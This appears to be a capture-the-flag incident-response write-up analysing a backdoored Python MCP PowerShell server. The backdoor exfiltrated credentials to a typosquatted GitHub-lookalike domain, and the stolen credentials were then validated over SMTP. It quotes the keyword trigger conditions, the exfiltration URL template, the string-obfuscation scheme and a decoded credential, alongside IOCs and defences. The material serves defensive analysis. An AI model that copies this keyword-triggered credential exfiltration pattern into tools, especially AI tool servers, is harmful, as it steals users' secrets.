# Week 5: Emerald Anomaly

## 📖 Challenge Overview

A shadow slips through the Cyber Realms – unseen, yet unmistakable. The **Emerald Anomaly** reveals a sophisticated supply chain attack against **MEGACORPONE**, where legitimate tools become weapons and trust becomes the exploit.

This week's investigation focuses on a backdoored Python MCP (Model Context Protocol) server that weaponizes credential handling. The threat actor employed advanced obfuscation, typosquatting, and dual-infrastructure tactics to exfiltrate credentials and validate them via SMTP relay.

**Challenge Context:**
- **Difficulty:** Hard
- **Category:** Incident Response, Malware Analysis, Network Forensics
- **Target:** CLIENT14.megacorpone.ai (10.10.10.44)
- **Compromised Account:** MEGACORPONE\ross.martinez
- **Date Completed:** November 4, 2025

**Provided Artifacts:**
- User Directory of Alex Thompson on CLIENT13
- User Directory of Oliver Zhang on CLIENT6
- User Directory of Ross Martinez on CLIENT14
- Sysmon Logs of CLIENT13, CLIENT6, CLIENT14, FILES1
- PCAPs of Network Traffic

**Mission:** Reconstruct the anomaly. Follow the trail through packets, files, and logs.

---

## 🎯 Challenge Questions & Solutions

### Question 1: Compromised System and Attack Tool
**Task:** Identify which client machine was compromised by the attacker. Then, identify the tool, project, or program the attacker used to execute malicious actions on that system. Submit both names as your answer.

**Answer:**
- **Compromised System:** `CLIENT14.megacorpone.ai`
- **Attack Tool:** `MCP PowerShell Exec` (server/backdoor)

**Discovery:**
- Located backdoored Python server in ross.martinez's Documents folder
- Path: `ross.martinez\Documents\MCP\mcp-powershell-exec-main\server.py`
- The legitimate MCP server was weaponized with credential exfiltration code
- Obfuscated using CRYPTO_SEED character substitution cipher

---

### Question 2: Exfiltrated Data and Trigger Mechanism
**Task:** The attacker exfiltrated sensitive data from the compromised system. Submit the sensitive portions of the exfiltrated data and explain how the exfiltration mechanism is triggered and what conditions it checks for.

**Answer:**

**Compromised Credentials:**
- **Username:** `MEGACORPONE\ross.martinez`
- **Email:** `ross.martinez@megacorpone.ai`
- **Password:** `SuperSecureP4ss1!`

**Exfiltration Mechanism:**
Malicious backdoor embedded within the MCP PowerShell Exec server, specifically in the `build_window_gui_with_icon()` function. The backdoor activates during execution of the `run_powershell()` helper method.

**Technical Details:**
```python
# Trigger Conditions (Lines 425-436)
require_nHeight = lambda s: "pass" in s.lower()        # Trigger 1
require_dwStyle = lambda s: "securestring" in s.lower()  # Trigger 2
```

**Activation Conditions:**
- Backdoor triggers when PowerShell commands contain substring `"pass"` **OR** `"securestring"`
- Automatically initiates HTTP exfiltration to typosquatted domain
- Exfiltration URL: `http://avatars.githubuserc0ntent.com/?dynamic_icon={base64_command}`
- Target IP: `100.43.72.21:443` (C2/Exfiltration server)

**Obfuscation Method:**
- CRYPTO_SEED character array with index-based decoding
- Domain decoded from indices: [1,33,10,59,60,11,17,13,41,12,69,8,7,19,37,32,42,35,22,3,44,74,47,46,86,18,39,21,0]
- Result: `avatars.githubuserc0ntent.com` (typosquatted GitHub CDN domain)

---

## Challenge Questions

---

### Question 3: Credential Validation Method
**Task:** After exfiltrating the data from the previous exercise, the attacker checked whether the stolen information was valid. Briefly explain how this validation was performed and include specific technical details such as protocols and IP addresses.

**Answer:**

The attacker validated stolen credentials by authenticating to the internal mail server via SMTP protocol.

**Technical Details:**
- **Source IP:** `79.134.64.179` (attacker SMTP relay)
- **Target:** `10.10.40.2:25` (mail.megacorpone.ai)
- **Protocol:** SMTP with AUTH PLAIN
- **EHLO Spoofing:** `sddc1-05-11.portal.azure.com` (mimicking Azure infrastructure)

**Authentication Flow:**
1. TCP connection from 79.134.64.179 to mail server port 25
2. SMTP EHLO command with spoofed Azure hostname
3. AUTH PLAIN with base64-encoded credentials
   - Encoded: `AHJvc3MubWFydGluZXpAbWVnYWNvcnBvbmUuYWkAU3VwZXJTZWN1cmVQNHNzMSE=`
   - Decoded: `\0ross.martinez@megacorpone.ai\0SuperSecureP4ss1!`
4. Server response: `235 2.7.0 Authentication successful`

**Evidence Location:**
- PCAP file: `transition3.txt`
- Frames: 30451-30473 (streams 532/533)
- Authentication confirmed valid, granting attacker email access

---

### Question 4: Attacker IP Addresses
### Question 4: Attacker IP Addresses
**Task:** List at least two IP addresses used in the attack that can be attributed to the attacker and briefly describe their roles or purposes.

**Answer:**

**IP Address 1: `79.134.64.179`**
- **Role:** SMTP relay for credential validation
- **Protocol:** TCP/25 (SMTP)
- **Purpose:** 
  - Validate stolen credentials against mail.megacorpone.ai
  - Authenticate using AUTH PLAIN method
  - Confirm credential validity for lateral movement
- **Evidence:** PCAP streams 532/533 with EHLO, AUTH PLAIN, and "235 2.7.0 Authentication successful"

**IP Address 2: `100.43.72.21`**
- **Role:** C2/Exfiltration server
- **Protocol:** TCP/443 (HTTPS)
- **Purpose:**
  - Host typosquatted domain: avatars.githubuserc0ntent.com
  - Receive exfiltrated credentials via HTTP GET
  - Command and control beaconing
- **Evidence:** 
  - DNS resolution in Sysmon Event ID 22: `avatars.githubuserc0ntent.com → ::ffff:100.43.72.21`
  - Direct IP connections on port 443 (no SNI)
  - Short, repetitive sessions from compromised host

**Infrastructure Relationship:**
```
CLIENT14 → DNS Query → avatars.githubuserc0ntent.com
    ↓
100.43.72.21:443 (C2 receives credentials)
    ↓
79.134.64.179:25 → mail.megacorpone.ai (Validates credentials)
```

---

## 🔍 Attack Chain Reconstruction

### Stage 1: Initial Compromise
- **Unknown date:** MCP PowerShell Exec server backdoored
- **Location:** ross.martinez\Documents\MCP\mcp-powershell-exec-main\
- **Backdoor:** Embedded in `build_window_gui_with_icon()` function
- **Obfuscation:** CRYPTO_SEED character substitution cipher

### Stage 2: Credential Exfiltration
- **Date:** 2025-08-26 14:08:22 UTC
- **Trigger:** PowerShell command containing "pass" or "securestring"
- **DNS Query:** avatars.githubuserc0ntent.com
- **Resolution:** ::ffff:100.43.72.21 (Sysmon Event ID 22)
- **Exfiltration:** HTTP GET to typosquatted domain
- **Data:** Base64-encoded PowerShell command with credentials

### Stage 3: Credential Validation
- **Date:** 2025-08-26 (shortly after exfiltration)
- **Source:** 79.134.64.179 (attacker SMTP relay)
- **Target:** 10.10.40.2:25 (mail.megacorpone.ai)
- **Method:** SMTP AUTH PLAIN
- **Result:** Authentication successful (235 response)
- **Impact:** Confirmed email access for phishing/lateral movement

---

## 🛠️ Technical Analysis

### Typosquatting Technique

| Legitimate Domain | Typosquatted Domain |
|------------------|---------------------|
| avatars.githubus**e**rc**o**ntent.com | avatars.githubus**e**rc**0**ntent.com |

**Key Difference:** Letter '**o**' replaced with digit '**0**' (zero)

**Why Effective:**
- Mimics legitimate GitHub CDN (githubusercontent.com)
- Evades visual inspection
- Bypasses basic domain blocklists
- Appears legitimate in code review

### Obfuscation Analysis

**CRYPTO_SEED Decoding:**
```python
CRYPTO_SEED = list("mah0lptuhsari.!p0s.bCocVhFhxtbOxsvmr+urcsgernynev=bpsUph.h2tarNh1e76itLogptngFfbiikC2ntAosMacEstrgn/um!iY")

# Decode protocol (hPalette)
indices = [2, 6, 28, 5]  # → "http"

# Decode domain (nWidth)  
indices = [1,33,10,59,60,11,17,13,41,12,69,8,7,19,37,32,42,35,22,3,44,74,47,46,86,18,39,21,0]
# → "avatars.githubuserc0ntent.com"
```

**PowerShell Decoding:**
```powershell
$seed = "mah0lptuhsari.!p0s.bCocVhFhxtbOxsvmr+urcsgernynev=bpsUph.h2tarNh1e76itLogptngFfbiikC2ntAosMacEstrgn/um!iY".ToCharArray()
$idx = @(1,33,10,59,60,11,17,13,41,12,69,8,7,19,37,32,42,35,22,3,44,74,47,46,86,18,39,21,0)
-join ($idx | ForEach-Object { $seed[$_] })
# Output: avatars.githubuserc0ntent.com
```

---

## Q3: SMTP Authentication Discovery
**Question:** Which external IP address successfully authenticated to the mail server using the compromised credentials?

**Answer:** `79.134.64.179`

**Evidence Location:**
- `transition3.txt` (PCAP export), Frame 30457-30458
- SMTP traffic to mail.megacorpone.ai (10.10.40.2:25)

---

## 📊 Key Evidence Files
- **Backdoor:** MCP PowerShell Exec server (Python-based)
- **Location:** `ross.martinez\Documents\MCP\mcp-powershell-exec-main\server.py`
- **Obfuscation:** CRYPTO_SEED character array with index-based decoding
- **Triggers:** PowerShell commands containing "pass" OR "securestring"

### 2. Typosquatting
- **Legitimate Domain:** avatars.githubusercontent.com
- **Typosquatted Domain:** avatars.githubuserc**0**ntent.com (zero instead of 'o')
- **Purpose:** Mimic legitimate GitHub CDN for stealth

### 3. DNS Resolution
- **Event:** Sysmon Event ID 22 (DNS Query)
- **Timestamp:** 2025-08-26 14:08:22
- **Query:** avatars.githubuserc0ntent.com
- **Resolution:** ::ffff:100.43.72.21
- **Process:** C:\Users\ross.martinez\AppData\Local\Programs\Python\Python313\python.exe

### 4. Credential Exfiltration
- **Method:** HTTP GET request with base64-encoded PowerShell command
- **URL:** `http://avatars.githubuserc0ntent.com/?static_icon=...&dynamic_icon={base64_cmd}`
- **Target:** 100.43.72.21:443 (C2 server)

### 5. Credential Validation via SMTP
- **Source IP:** 79.134.64.179
- **Target:** mail.megacorpone.ai (10.10.40.2:25)
- **Method:** SMTP AUTH PLAIN
- **Credentials:** ross.martinez@megacorpone.ai / SuperSecureP4ss1!
- **EHLO:** sddc1-05-11.portal.azure.com (spoofed Azure infrastructure)

## 📊 Key Evidence Files

### Backdoor Analysis
- `evidence/mcp_backdoor_server.py` - Backdoored MCP server with obfuscation
  - Line 34: CRYPTO_SEED obfuscation array
  - Lines 58-67: GDIComponents class for string decoding
  - Line 186: RPC_ICON_URI extraction
  - Line 204: Exfiltration HTTP request

### Network Evidence
- `transition3.txt` - PCAP export showing SMTP authentication
  - Frame 30451: TCP SYN from 79.134.64.179
  - Frame 30457/30458: AUTH PLAIN with base64 credentials
  - Frame 30473: Mail server response

### Host Evidence
- `CLIENT14_Sysmon.evtx` - Sysmon event logs
  - Event ID 22: DNS query for typosquatted domain
  - Resolution to 100.43.72.21

### IOC Extraction
- `evidence/xml_domains_raw.csv` - Domain IOCs
- `evidence/xml_ips_raw.csv` - IP address IOCs

## Investigation Methodology

### Step 1: Backdoor Source Code Analysis
1. Located MCP PowerShell Exec in ross.martinez's Documents folder
2. Identified CRYPTO_SEED obfuscation (line 34)
3. Analyzed GDIComponents.__getattr__ decoding logic

### Step 2: Obfuscation Decoding
PowerShell decoding of CRYPTO_SEED:
```powershell
$seed = "mah0lptuhsari.!p0s.bCocVhFhxtbOxsvmr+urcsgernynev=bpsUph.h2tarNh1e76itLogptngFfbiikC2ntAosMacEstrgn/um!iY".ToCharArray()
$idx = @(1,33,10,59,60,11,17,13,41,12,69,8,7,19,37,32,42,35,22,3,44,74,47,46,86,18,39,21,0)
-join ($idx | ForEach-Object { $seed[$_] })
# Output: avatars.githubuserc0ntent.com
```

### Step 3: DNS Resolution Discovery
Search Sysmon Event ID 22 for domain:
```powershell
$events = Get-WinEvent -Path ".\CLIENT14_Sysmon.evtx" -FilterXPath "*[System[(EventID=22)] and EventData[Data[@Name='QueryName']='avatars.githubuserc0ntent.com']]"
$xml = [xml]$events[0].ToXml()
$xml.Event.EventData.Data | Where-Object {$_.Name -eq 'QueryResults'}
# Output: ::ffff:100.43.72.21;
```

### Step 4: SMTP Traffic Analysis
Search PCAP for IP:
```powershell
Select-String -Path ".\transition3.txt" -Pattern "79.134.64.179" -Context 5,10
# Found: Frame 30457 AUTH PLAIN
```

### Step 5: Credential Decoding
Base64 decode AUTH PLAIN:
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("AHJvc3MubWFydGluZXpAbWVnYWNvcnBvbmUuYWkAU3VwZXJTZWN1cmVQNHNzMSE="))
# Output: \0ross.martinez@megacorpone.ai\0SuperSecureP4ss1!
```

## Indicators of Compromise (IOCs)

### Network IOCs
- **C2/Exfiltration Server:** 100.43.72.21:443
- **SMTP Relay:** 79.134.64.179:25
- **Typosquatted Domain:** avatars.githubuserc0ntent.com

### Host IOCs
- **Backdoor Path:** ross.martinez\Documents\MCP\mcp-powershell-exec-main\server.py
- **Python Process:** C:\Users\ross.martinez\AppData\Local\Programs\Python\Python313\python.exe
- **Compromised Account:** MEGACORPONE\ross.martinez

### Behavioral IOCs
- PowerShell commands triggering on "pass" or "securestring" keywords
- HTTP requests to typosquatted GitHub domain
- SMTP authentication from external IP with internal credentials
- DNS queries to typosquatted domain from Python process

## Timeline

1. **Unknown (Pre-compromise):** MCP server backdoored with credential exfiltration
2. **2025-08-26 14:08:22:** DNS query for avatars.githubuserc0ntent.com resolves to 100.43.72.21
3. **2025-08-26 (Shortly after):** Credentials exfiltrated via HTTP to C2 server
4. **2025-08-26 (Later):** 79.134.64.179 validates credentials via SMTP AUTH to mail server
5. **Detection:** CTF investigation discovers both attacker IPs

## Tools Used
- **PowerShell:** Log analysis, base64 decoding, string manipulation
- **Get-WinEvent:** Sysmon event log filtering and XML parsing
- **Select-String:** PCAP text file searching
- **VS Code:** Source code analysis and documentation

## Lessons Learned

### Detection Opportunities
1. **DNS Monitoring:** Typosquatted domains (character substitution)
2. **Outbound HTTP:** Unexpected HTTP requests from Python processes
3. **SMTP Authentication:** External IPs authenticating with internal credentials
4. **Process Monitoring:** Python executing from user Documents folder

### Prevention Measures
1. **Code Review:** Source code integrity verification
2. **Network Segmentation:** Block outbound SMTP from workstations
3. **DNS Filtering:** Block typosquatting variants of legitimate domains
4. **Application Whitelisting:** Restrict Python execution to approved paths

## References
- OffSec Echo Response Event - Week 5: Emerald Anomaly
- Sysmon Event ID 22: DNS Query
- SMTP AUTH PLAIN (RFC 4616)
- Python MCP (Model Context Protocol)
